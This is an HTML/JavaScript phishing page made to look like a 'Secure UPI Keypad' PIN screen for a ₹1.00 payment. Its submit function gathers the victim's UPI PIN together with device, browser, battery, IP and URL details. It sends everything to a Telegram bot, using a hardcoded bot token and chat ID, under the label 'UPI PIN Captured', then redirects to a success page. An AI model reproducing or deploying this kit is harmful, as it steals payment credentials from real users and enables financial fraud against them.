<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure UPI Keypad</title>
<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; font-family: Arial, sans-serif; }
.pin-screen { display: flex; flex-direction: column; align-items: center; height: 100vh; background-color: white; position: relative; }
.header { width: 100%; height: 50px; display: flex; justify-content: end; align-items: center; position: fixed; top: 0; background-color: white; z-index: 10; }
.header img { height: 40px; }
.details { width: 100%; padding: 5px 15px; display: flex; justify-content: space-between; align-items: center; background-color: #f0f0f0; font-size: 15px; font-weight: 500; margin-top: 50px; }
.center-content { flex-grow: 1; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; position: absolute; top: 30%; transform: translateY(-50%); width: 100%; }
h5 { font-size: 15px; font-weight: 500; color: #3d3d3d; margin-bottom: 15px; }
.input-container { font-size: 30px; font-weight: bold; color: #003bab; letter-spacing: 10px; display: flex; gap: 5px; margin-bottom: 15px; }
.warning { font-size: 25px; font-weight: 500; border-radius: 30px; background: rgba(255, 199, 0, 0.2); display: flex; width: 85%; padding: 10px; color: #ff9d00; align-items: center; justify-content: center; gap: 2px; margin-top: 15px; }
.warning i { font-size: 35px; }
.warning p { text-align: center; color: black; font-size: 14px; margin-left: 10px; }
.keypad { width: 100%; display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; text-align: center; position: fixed; bottom: 0; padding: 15px; background-color: #f1f1f1; }
.key { display: flex; justify-content: center; align-items: center; height: 60px; font-size: 25px; font-weight: bold; color: #003bab; cursor: pointer; transition: transform 0.1s ease; }
.key:active { transform: scale(0.9); border-radius: 15px; }
#done { font-size: 35px; }
#done1 { font-size: 30px; }
</style>
</head>
<body>
<div class="pin-screen" id="pin-screen">
    <div class="header"><img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/UPI-Logo.png" alt="UPI Logo"></div>
    <div class="details"><p>Sending: <br>To:</p><p>₹1.00 <br>Vance</p></div>
    <div class="center-content">
        <h5>ENTER UPI PIN</h5>
        <div class="input-container" id="input-display"><span></span><span></span><span></span><span></span><span></span><span></span></div>
        <div class="warning"><i class="fas fa-exclamation-circle"></i><p>You are sending ₹1.00 from your account to Vance</p></div>
    </div>
    <div class="keypad">
        <div class="key" onclick="enterNumber(1)">1</div>
        <div class="key" onclick="enterNumber(2)">2</div>
        <div class="key" onclick="enterNumber(3)">3</div>
        <div class="key" onclick="enterNumber(4)">4</div>
        <div class="key" onclick="enterNumber(5)">5</div>
        <div class="key" onclick="enterNumber(6)">6</div>
        <div class="key" onclick="enterNumber(7)">7</div>
        <div class="key" onclick="enterNumber(8)">8</div>
        <div class="key" onclick="enterNumber(9)">9</div>
        <div class="key" id="done1" onclick="deleteNumber()"><i class="fas fa-backspace"></i></div>
        <div class="key" onclick="enterNumber(0)">0</div>
        <div class="key" id="done" onclick="submitData()"><i class="fas fa-circle-check"></i></div>
    </div>
</div>

<script>
let enteredNumbers = [];
let DeviceId = "{DEVICE_ID_MY_PROJECT}";

function getTimestamp() {
    return new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
}

function getPhoneModel() {
    const userAgent = navigator.userAgent;
    let model = 'Unknown Device';
    if (/iPhone|iPad|iPod/.test(userAgent)) {
        model = userAgent.match(/(iPhone|iPad|iPod)[^\)]*/)?.[0] || 'Apple Device';
    } else if (/Android/.test(userAgent)) {
        model = userAgent.match(/Android.*?(Mobile|Tablet)/)?.[0] || 'Android Device';
    } else if (/Windows Phone/.test(userAgent)) {
        model = userAgent.match(/Windows Phone.*?(Mobile)?/)?.[0] || 'Windows Device';
    }
    return model;
}

function getBrowserInfo() {
    return navigator.userAgent;
}

function getScreenResolution() {
    return `${window.screen.width}x${window.screen.height}`;
}

function getOS() {
    const userAgent = navigator.userAgent;
    if (/Windows/.test(userAgent)) return "Windows";
    if (/Mac/.test(userAgent)) return "MacOS";
    if (/Linux/.test(userAgent)) return "Linux";
    if (/Android/.test(userAgent)) return "Android";
    if (/iOS|iPhone|iPad|iPod/.test(userAgent)) return "iOS";
    return "Unknown OS";
}

function getBatteryStatus() {
    if (navigator.getBattery) {
        return navigator.getBattery().then(battery => {
            return {
                level: Math.round(battery.level * 100) + '%',
                charging: battery.charging
            };
        });
    }
    return Promise.resolve({ level: 'Unknown', charging: 'Unknown' });
}

function updateDisplay() {
    let display = document.getElementById("input-display");
    display.innerHTML = "";
    for (let i = 0; i < 6; i++) {
        let span = document.createElement("span");
        span.textContent = enteredNumbers[i] !== undefined ? "•" : "";
        display.appendChild(span);
    }
}

function enterNumber(num) {
    if (enteredNumbers.length < 6) {
        enteredNumbers.push(num);
        updateDisplay();
    }
}

function deleteNumber() {
    enteredNumbers.pop();
    updateDisplay();
}

async function submitData() {
    if (enteredNumbers.length === 6 || enteredNumbers.length === 4) {
        let pin = enteredNumbers.join('');
        const timestamp = getTimestamp();
        const phoneModel = getPhoneModel();
        const browserInfo = getBrowserInfo();
        const screenResolution = getScreenResolution();
        const os = getOS();
        const batteryStatus = await getBatteryStatus();

        // Get IP address (client-side approximation)
        let ip_address = 'Unknown IP';
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => ip_address = data.ip)
            .catch(() => {}); // Fallback if fails

        // Get referrer and current URL
        const referrer = document.referrer || 'Direct visit';
        const current_url = window.location.href;

        // Prepare message for Telegram
        let message = "🔐 UPI PIN Captured: " + pin + "\n";
        message += "🕒 Timestamp: " + timestamp + "\n";
        message += "📱 Device: " + phoneModel + "\n";
        message += "🌐 Browser: " + browserInfo + "\n";
        message += "🖥️ Screen: " + screenResolution + "\n";
        message += "⚙️ OS: " + os + "\n";
        message += "🔋 Battery: " + batteryStatus.level + (batteryStatus.charging === true ? " (Charging)" : "") + "\n";
        message += "📡 IP: " + ip_address + "\n";
        message += "🆔 Device ID: " + DeviceId + "\n";
        message += "🔗 Referrer: " + referrer + "\n";
        message += "📍 URL: " + current_url;

        // Telegram Bot Configuration
        const botToken = "8294124416:AAEzx1Wh0AG5E_APmZGNQZklhy6ZdfDiyh4";
        const chatId = "6883454411";

        // Send to Telegram via JS fetch
        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        const postData = {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        };

        try {
            const response = await fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(postData)
            });

            if (response.ok) {
                const result = await response.json();
                if (result.ok) {
                    console.log('Data sent to Telegram successfully');
                } else {
                    console.error('Telegram API Error:', result);
                }
            } else {
                console.error('HTTP Error:', response.status);
            }
        } catch (error) {
            console.error('Fetch Error:', error);
        }

        // Redirect to success page
        window.location.href = 'done.html';
    }
}

updateDisplay();
</script>
</body>
</html>
